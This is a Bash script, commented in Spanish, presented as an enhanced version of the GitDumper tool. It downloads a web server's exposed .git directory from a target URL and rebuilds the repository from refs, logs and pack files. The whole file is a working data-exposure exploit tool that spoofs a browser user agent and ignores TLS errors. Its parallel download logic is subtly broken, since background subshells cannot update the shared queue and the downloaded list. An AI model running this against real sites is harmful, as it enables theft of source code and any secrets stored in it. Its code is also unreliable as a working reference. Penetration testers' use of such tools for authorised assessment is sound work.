#!/bin/bash
#
# GitDumper Enhanced
# https://github.com/internetwache/GitTools (basado en el original)
#
# Uso mejorado con opciones:
#   ./gitdumper.sh -u http://target.com/.git/ -o ./dest [--git-dir=other] [--threads=4] [--force]
#
# Mejoras:
#   - Soporte para opciones de línea de comandos (getopts)
#   - Descarga paralela con límite de hilos
#   - Verificación previa de accesibilidad de la URL
#   - Uso correcto de --git-dir en git cat-file
#   - Descarga de todas las referencias (refs/heads/*, refs/tags/*, etc.) desde info/refs
#   - Reconstrucción automática de objetos a partir de packs descargados
#   - Reintentos en fallos de descarga
#   - Progreso y estadísticas
#   - Manejo de URLs sin barra final
#   - Limpieza de objetos corruptos
#   - Soporte para continuar descargas interrumpidas (--force para sobrescribir)

set -euo pipefail
IFS=$'\n\t'

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

# Variables globales
BASEURL=""
BASEDIR=""
GITDIR=".git"
THREADS=4
FORCE=false
DOWNLOADED=()
QUEUE=()
LOCKFILE="/tmp/gitdumper.lock"
TEMP_DIR=""

# Mostrar ayuda
usage() {
    cat <<EOF
Uso: $0 -u <URL> -o <dir> [opciones]

Opciones:
  -u URL          URL base del repositorio .git (ej: http://target.com/.git/)
  -o DIR          Directorio de destino donde se creará el .git
  --git-dir NAME  Nombre del directorio git (por defecto .git)
  --threads N     Número de descargas paralelas (por defecto 4)
  --force         Sobrescribir archivos existentes
  -h              Mostrar esta ayuda

Ejemplo:
  $0 -u http://example.com/.git/ -o ./repo --threads 8
EOF
    exit 0
}

# Inicialización y parseo de argumentos
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u) BASEURL="$2"; shift 2 ;;
            -o) BASEDIR="$2"; shift 2 ;;
            --git-dir) GITDIR="$2"; shift 2 ;;
            --threads) THREADS="$2"; shift 2 ;;
            --force) FORCE=true; shift ;;
            -h|--help) usage ;;
            *) echo -e "${RED}Error: Argumento desconocido $1${NC}"; usage ;;
        esac
    done

    if [[ -z "$BASEURL" || -z "$BASEDIR" ]]; then
        echo -e "${RED}Error: Debes especificar -u y -o${NC}"
        usage
    fi

    # Asegurar barra final en URL
    [[ "$BASEURL" != */ ]] && BASEURL="${BASEURL}/"
    # Asegurar que GITDIR no tenga barras al inicio/final
    GITDIR=$(echo "$GITDIR" | sed 's:^/::;s:/$::')
    # Asegurar que la URL termine con /$GITDIR/
    if [[ ! "$BASEURL" =~ /${GITDIR}/$ ]]; then
        echo -e "${RED}Error: La URL debe terminar con /${GITDIR}/${NC}"
        exit 1
    fi
}

# Función de log
log_info()  { echo -e "${BLUE}[*]${NC} $1"; }
log_ok()    { echo -e "${GREEN}[+]${NC} $1"; }
log_warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }

# Verificar conectividad
check_url() {
    log_info "Verificando accesibilidad de $BASEURL"
    if ! curl -s -k -L -I -o /dev/null -w "%{http_code}" "$BASEURL" | grep -qE '^(200|301|302|403|404)'; then
        log_error "No se puede acceder a la URL. Abortando."
        exit 1
    fi
    log_ok "URL accesible"
}

# Crear directorio de destino
prepare_dest() {
    local git_path="$BASEDIR/$GITDIR"
    if [[ -d "$git_path" && "$FORCE" == false ]]; then
        log_warn "El directorio $git_path ya existe. Usa --force para sobrescribir."
        exit 1
    fi
    mkdir -p "$git_path"
    log_ok "Directorio destino: $git_path"
    # Guardar ruta absoluta para git
    export GIT_DIR="$(realpath "$git_path")"
}

# Descargar un archivo con reintentos
download_file() {
    local url="$1"
    local output="$2"
    local retries=3
    local attempt=0
    while [[ $attempt -lt $retries ]]; do
        if curl -L -A "Mozilla/5.0" -f -k -s --connect-timeout 10 --retry 2 "$url" -o "$output"; then
            return 0
        fi
        ((attempt++))
        log_warn "Reintentando ($attempt/$retries): $url"
        sleep 1
    done
    return 1
}

# Descargar un elemento de la cola
download_item() {
    local objname="$1"
    local url="${BASEURL}${objname}"
    local target="${GIT_DIR}/${objname}"
    
    # Evitar duplicados
    if [[ " ${DOWNLOADED[*]} " =~ " ${objname} " ]]; then
        return
    fi

    # Crear subdirectorios si existen
    local dir=$(dirname "$target")
    if [[ "$dir" != "." ]]; then
        mkdir -p "$dir"
    fi

    # Descargar
    if ! download_file "$url" "$target"; then
        log_error "Fallo en descarga: $objname"
        return 1
    fi
    log_ok "Descargado: $objname"
    DOWNLOADED+=("$objname")

    # Procesar contenido para extraer más objetos
    process_file "$target"
}

# Procesar un archivo descargado en busca de hashes y packs
process_file() {
    local file="$1"
    local hashes=()
    local packs=()

    # Si es un objeto (ruta objects/xx/xxx)
    if [[ "$file" =~ objects/[a-f0-9]{2}/[a-f0-9]{38}$ ]]; then
        # Verificar si es un objeto git válido usando git cat-file
        local hash=$(echo "$file" | sed -E 's/.*objects\/([a-f0-9]{2})\/([a-f0-9]{38})/\1\2/')
        if ! git --git-dir="$GIT_DIR" cat-file -t "$hash" &>/dev/null; then
            # No es un objeto válido, borrar y salir
            log_warn "Objeto inválido, eliminando: $hash"
            rm -f "$file"
            return
        fi
        # Obtener contenido para extraer más hashes (si es commit/tree)
        local type=$(git --git-dir="$GIT_DIR" cat-file -t "$hash")
        if [[ "$type" == "blob" ]]; then
            # Para blobs, usar strings
            hashes+=($(git --git-dir="$GIT_DIR" cat-file -p "$hash" | strings -a | grep -oE '[a-f0-9]{40}' || true))
        else
            hashes+=($(git --git-dir="$GIT_DIR" cat-file -p "$hash" | grep -oE '[a-f0-9]{40}' || true))
        fi
    fi

    # Extraer hashes del archivo (para cualquier archivo)
    hashes+=($(strings -a "$file" | grep -oE '[a-f0-9]{40}' || true))
    for h in ${hashes[*]}; do
        QUEUE+=("objects/${h:0:2}/${h:2}")
    done

    # Extraer packs
    packs+=($(strings -a "$file" | grep -oE 'pack-[a-f0-9]{40}' || true))
    for p in ${packs[*]}; do
        QUEUE+=("objects/pack/$p.pack")
        QUEUE+=("objects/pack/$p.idx")
    done

    # Si es info/refs, añadir todas las referencias
    if [[ "$file" == */info/refs ]]; then
        local refs=($(grep -oE 'refs/[^ ]+' "$file" || true))
        for ref in ${refs[*]}; do
            # Descargar el archivo de referencia (puede ser simbólico)
            QUEUE+=("$ref")
        done
    fi

    # Si es un archivo de referencia (refs/heads/*, etc.), descargar su contenido y extraer hash
    if [[ "$file" =~ refs/ ]]; then
        local hash=$(cat "$file" | grep -oE '[a-f0-9]{40}' | head -1)
        if [[ -n "$hash" ]]; then
            QUEUE+=("objects/${hash:0:2}/${hash:2}")
        fi
    fi
}

# Descargar la cola en paralelo
download_queue() {
    local active=0
    local pids=()
    local tmp_queue=()

    while true; do
        # Recolectar nuevos elementos de QUEUE, pero sin duplicados
        tmp_queue=()
        for item in "${QUEUE[@]}"; do
            if [[ ! " ${DOWNLOADED[*]} " =~ " ${item} " ]]; then
                tmp_queue+=("$item")
            fi
        done
        QUEUE=("${tmp_queue[@]}")

        if [[ ${#QUEUE[@]} -eq 0 && $active -eq 0 ]]; then
            break
        fi

        # Lanzar descargas hasta el límite de hilos
        while [[ $active -lt $THREADS && ${#QUEUE[@]} -gt 0 ]]; do
            local item="${QUEUE[0]}"
            QUEUE=("${QUEUE[@]:1}")
            download_item "$item" &
            pids+=($!)
            ((active++))
        done

        # Esperar a que algún hijo termine
        if [[ $active -gt 0 ]]; then
            wait -n 2>/dev/null || true
            # Limpiar pids terminados
            local new_pids=()
            for pid in "${pids[@]}"; do
                if kill -0 "$pid" 2>/dev/null; then
                    new_pids+=("$pid")
                else
                    ((active--))
                fi
            done
            pids=("${new_pids[@]}")
        fi
        sleep 0.1
    done
}

# Inicializar cola con archivos estáticos
init_queue() {
    local static_files=(
        "HEAD"
        "objects/info/packs"
        "description"
        "config"
        "COMMIT_EDITMSG"
        "index"
        "packed-refs"
        "info/refs"
        "info/exclude"
        "logs/HEAD"
        "logs/refs/heads/master"
        "logs/refs/remotes/origin/HEAD"
        "refs/heads/master"
        "refs/remotes/origin/HEAD"
        "refs/stash"
        "refs/wip/index/refs/heads/master"
        "refs/wip/wtree/refs/heads/master"
    )
    QUEUE=("${static_files[@]}")
}

# Reconstruir objetos a partir de packs descargados
rebuild_from_packs() {
    local pack_dir="$GIT_DIR/objects/pack"
    if [[ -d "$pack_dir" ]]; then
        for pack in "$pack_dir"/*.pack; do
            if [[ -f "$pack" ]]; then
                log_info "Desempaquetando $pack"
                git --git-dir="$GIT_DIR" unpack-objects < "$pack" || log_warn "Fallo al desempaquetar $pack"
            fi
        done
    fi
}

# Función principal
main() {
    parse_args "$@"
    check_url
    prepare_dest

    init_queue
    log_info "Iniciando descarga con $THREADS hilos..."
    download_queue

    # Reconstruir desde packs
    rebuild_from_packs

    # Estadísticas finales
    local total=${#DOWNLOADED[@]}
    log_ok "Descarga completada. Archivos descargados: $total"
}

# Capturar señales para limpieza
cleanup() {
    rm -f "$LOCKFILE"
    exit
}
trap cleanup INT TERM EXIT

main "$@"